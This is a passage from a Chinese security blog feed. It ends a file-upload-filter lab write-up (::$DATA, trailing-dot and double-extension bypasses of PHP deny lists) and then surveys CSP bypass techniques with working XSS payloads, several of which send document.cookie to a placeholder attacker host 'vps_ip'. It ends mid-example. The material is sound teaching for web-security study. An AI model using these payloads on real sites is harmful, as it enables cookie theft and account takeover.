class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法：-4"><a href="#方法：-4" class="headerlink" title="方法："></a>方法：</h3><p>写个a.png:2.asp上传时a.png::$DATA即可</p><h2 id="9，构造文件后缀绕过"><a href="#9，构造文件后缀绕过" class="headerlink" title="9，构造文件后缀绕过"></a>9，构造文件后缀绕过</h2><h3 id="附上源码：-8"><a href="#附上源码：-8" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法：-5"><a href="#方法：-5" class="headerlink" title="方法："></a>方法：</h3><p>抓包改成”a.php. .”</p><h2 id="10，双写文件后缀绕过"><a href="#10，双写文件后缀绕过" class="headerlink" title="10，双写文件后缀绕过"></a>10，双写文件后缀绕过</h2><h3 id="附上源码：-9"><a href="#附上源码：-9" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法：-6"><a href="#方法：-6" class="headerlink" title="方法："></a>方法：</h3><p>抓包改成a.pphphp即可</p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CSP绕过思路及总结</title>
      <link href="/2019/10/19/CSP%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%80%BB%E7%BB%93/"/>
      <url>/2019/10/19/CSP%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h2 id="CSP简介"><a href="#CSP简介" class="headerlink" title="CSP简介"></a>CSP简介</h2><p>内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。<br>当代网站太容易收到XSS的攻击，CSP就是一个统一有效的防止网站收到XSS攻击的防御方法。CSP是一种白名单策略，当有从非白名单允许的JS脚本出现在页面中，浏览器会阻止脚本的执行。<br>CSP的具体介绍可以看看手册<a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP" target="_blank" rel="noopener">内容安全策略</a></p><h2 id="CSP的绕过"><a href="#CSP的绕过" class="headerlink" title="CSP的绕过"></a>CSP的绕过</h2><p>CSP的绕过从CSP的诞生开始就一直被前端的安全研究人员所热衷，本文总结一些我了解到的CSP的绕过方式，若有不足，敬请批评补充</p><h3 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h3><p>CSP不影响location.href跳转，因为当今大部分网站的跳转功能都是由前端实现的，CSP如果限制跳转会影响很多的网站功能。所以，用跳转来绕过CSP获取数据是一个万能的办法，虽然比较容易被发现，但是在大部分情况下对于我们已经够用<br>当我们已经能够执行JS脚本的时候，但是由于CSP的设置，我们的cookie无法带外传输，就可以采用此方法，将cookie打到我们的vps上</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = <span class="string">"vps_ip:xxxx?"</span>+<span class="built_in">document</span>.cookie</span><br></pre></td></tr></table></figure><p>有人跟我说可以跳过去再跳回来，但是这样不是会死循环一直跳来跳去吗2333333<br>利用条件:</p><ol><li>可以执行任意JS脚本，但是由于CSP无法数据带外</li></ol><h3 id="link标签导致的绕过"><a href="#link标签导致的绕过" class="headerlink" title="link标签导致的绕过"></a>link标签导致的绕过</h3><p>这个方法其实比较老，去年我在我机器上试的时候还行，现在就不行了<br>因为这个标签当时还没有被CSP约束，当然现在浏览器大部分都约束了此标签，但是老浏览器应该还是可行的。<br>所以我们可以通过此标签将数据带外</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- firefox --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//$&#123;cookie&#125;.vps_ip"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">&lt;!-- chrome --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"//vps_ip?$&#123;cookie&#125;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然这个是我们写死的标签，如何把数据带外？</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> link = <span class="built_in">document</span>.createElement(<span class="string">"link"</span>);</span><br><span class="line">link.setAttribute(<span class="string">"rel"</span>, <span class="string">"prefetch"</span>);</span><br><span class="line">link.setAttribute(<span class="string">"href"</span>, <span class="string">"//vps_ip/?"</span> + <span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.head.appendChild(link);</span><br></pre></td></tr></table></figure><p>这样就可以把cookie带外了<br>利用条件:</p><ol><li>可以执行任意JS脚本，但是由于CSP无法数据带外</li></ol><h3 id="使用Iframe绕过"><a href="#使用Iframe绕过" class="headerlink" title="使用Iframe绕过"></a>使用Iframe绕过</h3><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效<br>A页面:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- A页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'self'"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"flag"</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>B页面:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- B页面 --&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">&lt;!-- 下面模拟XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">iframe.src=<span class="string">"A页面"</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line"><span class="javascript">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">'flag'</span>).innerHTML),<span class="number">1000</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094532-76c02656-738e-1.png" alt="图片.png"><br>setTimeout是为了等待iframe加载完成<br>利用条件:</p><ol><li>一个同源站点内存在两个页面，一个页面存在CSP保护，另一个页面没有CSP保护且存在XSS漏洞</li><li>我们需要的数据在存在CSP保护的页面</li></ol><h3 id="用CDN来绕过"><a href="#用CDN来绕过" class="headerlink" title="用CDN来绕过"></a>用CDN来绕过</h3><p>一般来说，前端会用到许多的前端框架和库，部分企业为了减轻服务器压力或者其他原因，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险<br>这里给出orange师傅绕hackmd CSP的文章<a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">Hackmd XSS</a><br>案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP，如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'unsafe-eval' https://cdnjs.cloudflare.com;"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- foo="--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    &#123;&#123;constructor.constructor('alert(document.cookie)')()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个是存在低版本angular js的cdn服务商列表<br><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76</a><br>除了低版本angular js的模板注入，还有许多库可以绕过CSP<br>下面引用<a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">https://www.jianshu.com/p/f1de775bc43e</a><br>如果用了Jquery-mobile库，且CSP中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，可以用此exp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>还比如RCTF2018题目出现的AMP库,下面的标签可以获取名字为FLAG的cookie</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">amp-pixel</span> <span class="attr">src</span>=<span class="string">"http://your domain/?cid=CLIENT_ID(FLAG)"</span>&gt;</span><span class="tag">&lt;/<span class="name">amp-pixel</span>&gt;</span></span><br></pre></td></tr></table></figure><p>blackhat2017有篇ppt总结了可以被用来绕过CSP的一些JS库<br><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a><br>利用条件:</p><ol><li>CDN服务商存在某些低版本的js库</li><li>此CDN服务商在CSP白名单中</li></ol><h3 id="站点可控静态资源绕过"><a href="#站点可控静态资源绕过" class="headerlink" title="站点可控静态资源绕过"></a>站点可控静态资源绕过</h3><p>给一个绕过codimd的(实例)<a href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md" target="_blank" rel="noopener">codimd xss</a><br>案例中codimd的CSP中使用了<code>www.google-analytics.com</code><br>而<a href="http://www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP" target="_blank" rel="noopener">www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094532-76da0170-738e-1.png" alt="图片.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'unsafe-eval' https://www.google-analytics.com"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094532-76e2f1a4-738e-1.png" alt="图片.png"></p><p>同理，若其他站点下提供了可控静态资源的功能，且CSP中允许了此站点，则可以采用此方式绕过<br>利用条件:</p><ol><li>站点存在可控静态资源</li><li>站点在CSP白名单中</li></ol><h3 id="站点可控JSONP绕过"><a href="#站点可控JSONP绕过" class="headerlink" title="站点可控JSONP绕过"></a>站点可控JSONP绕过</h3><p>JSONP的详细介绍可以看看我之前的一篇文章<a href="https://xz.aliyun.com/t/4470" target="_blank" rel="noopener">https://xz.aliyun.com/t/4470</a><br>大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析<br>以ins’hack 2019/的bypasses-everywhere这道题为例，题目中的csp设置了<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src www.google.com; img-src *; default-src &apos;none&apos;; style-src &apos;unsafe-inline&apos;</span><br></pre></td></tr></table></figure><p>看上去非常天衣无缝，但是google站点存在了用户可控jsonp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src https://www.google.com"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094532-76ef45c6-738e-1.png" alt="图片.png"><br>配合注释符，我们即可执行任意js<br>下面是一些存在用户可控资源或者jsonp比较常用站点的github项目<br><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a><br>利用条件:</p><ol><li>站点存在可控Jsonp</li><li>站点在CSP白名单中</li></ol><h3 id="Base-uri绕过"><a href="#Base-uri绕过" class="headerlink" title="Base-uri绕过"></a>Base-uri绕过</h3><p>第一次知道base-uri绕过是RCTF 2018 rBlog的非预期解<a href="https://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup" target="_blank" rel="noopener">https://blog.cal1.cn/post/RCTF 2018 rBlog writeup</a><br>当服务器CSP script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用<code>&lt;base&gt;</code>标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径<br>exp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'nonce-test'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"//vps_ip/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'test'</span> <span class="attr">src</span>=<span class="string">"2.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-76fbf190-738e-1.png" alt="图片.png"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-770d1128-738e-1.png" alt="图片.png"><br>注意：如果页面的script-src不是采用的nonce而是self或者域名ip，则不能使用此方法，因为vps_ip不在csp白名单内</p><p>利用条件:</p><ol><li>script-src只使用nonce</li><li>没有额外设置base-uri</li><li>页面引用存在相对路径的<code>&lt;script&gt;</code>标签</li></ol><h3 id="不完整script标签绕过nonce"><a href="#不完整script标签绕过nonce" class="headerlink" title="不完整script标签绕过nonce"></a>不完整script标签绕过nonce</h3><p>考虑下下列场景，如果存在这样场景，该怎么绕过CSP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">"X-XSS-Protection:0"</span>);<span class="meta">?&gt;</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Security-Policy"</span> content=<span class="string">"default-src 'self'; script-src 'nonce-xxxxx'"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">'xxxxx'</span>&gt;</span><br><span class="line">  <span class="comment">//do some thing</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果我们输入 <code>http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)</code> 即可xss<br>这是因为当浏览器碰到一个左尖括号时，会变成标签开始状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性，所以第五行的&lt;script会变成一个属性，值为空，之后的nonce=’xxxxx’会被当成我们输入的script的标签的一个属性，相当于我们盗取了合法的script标签中的nonce，于是成功绕过了scripr-src<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-77196efa-738e-1.png" alt="图片.png"></p><p>但是在chrome中，虽然第二个&lt;script 被当成了属性名，但依旧会干扰chrome对标签的解析，造成错误，使我们的exp无法成功执行<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-772405ea-738e-1.png" alt="图片.png"><br>这里可以用到标签的一个技巧，当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 3.php --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">a</span>=<span class="string">"123"</span> <span class="attr">b</span>=<span class="string">"456"</span> <span class="attr">a</span>=<span class="string">"789"</span> <span class="attr">a</span>=<span class="string">"abc"</span>&gt;</span>123<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-772ac830-738e-1.png" alt="图片.png"></p><p>于是我们可以输入 <code>http://127.0.0.1/2.php?xss=123&lt;script src=&quot;data:text/plain,alert(1)&quot; a=123 a=</code><br>先新建一个a属性，然后再新建第二个a属性，这样我们就将第二个&lt;script赋给了第二个a属性，浏览器在解析的时候直接忽略了第二个属性及其后面的值，这样exp就能成功在chrome浏览器上执行<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-7734112e-738e-1.png" alt="图片.png"><br>利用条件:</p><ol><li>可控点在合法script标签上方,且其中没有其他标签</li><li>XSS页面的CSP script-src只采用了nonce方式</li></ol><h3 id="object-src绕过（PDFXSS）"><a href="#object-src绕过（PDFXSS）" class="headerlink" title="object-src绕过（PDFXSS）"></a>object-src绕过（PDFXSS）</h3><p>假如只有这一个页面，我们能有办法执行JS吗</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>在CSP标准里面，有一个属性是object-src，它限制的是 <object> <applet>标签的src，也就是插件的src<br>于是我们可以通过插件来执行Javascript代码，插件的js代码并不受script-src的约束<br>最常见的就是flash-xss，但是flash实在太老，而且我想在看的师傅们也很少会开浏览器的flash了，所以我这里也不说明了，这里主要讲之前一个提交asrc的pdf-xss为例<br>PDF文件中允许执行javascript脚本，但是之前浏览器的pdf解析器并不会解析pdf中的js，但是之前chrome的一次更新中突然允许加载pdf的javascript脚本</applet></object></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"//vps_ip/123.pdf"</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-77407888-738e-1.png" alt="图片.png"><br>当然pdf的xss并不是为所欲为，比如pdf-xss并不能获取页面cookie，但是可以弹窗，url跳转等<br>具体可以看看这篇文章<a href="https://blog.csdn.net/microzone/article/details/52850623" target="_blank" rel="noopener">https://blog.csdn.net/microzone/article/details/52850623</a><br>里面有上面实例用的恶意pdf文件</p><p>当然，上面的例子并没有设置default-src,所以我们可以用外域的pdf文件，如果设置了default-src，我们必须找到一个pdf的上传点，（当然能上传的话直接访问这个pdf就能xss了2333），然后再用标签引用同域的pdf文件</p><p>利用条件:</p><ol><li>没有设置object-src，或者object-src没有设置为’none’</li><li>pdf用的是chrome的默认解析器</li></ol><h3 id="SVG绕过"><a href="#SVG绕过" class="headerlink" title="SVG绕过"></a>SVG绕过</h3><p>SVG作为一个矢量图，但是却能够执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss</p><p>之前的easer CONFidence CTF就出过svg的xss<br>引用 <a href="https://www.smi1e.top/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E4%BA%86%E8%A7%A3%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E5%92%8Csvg-xss/" target="_blank" rel="noopener">https://www.smi1e.top/通过一道题了解缓存投毒和svg-xss/</a><br>1.svg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 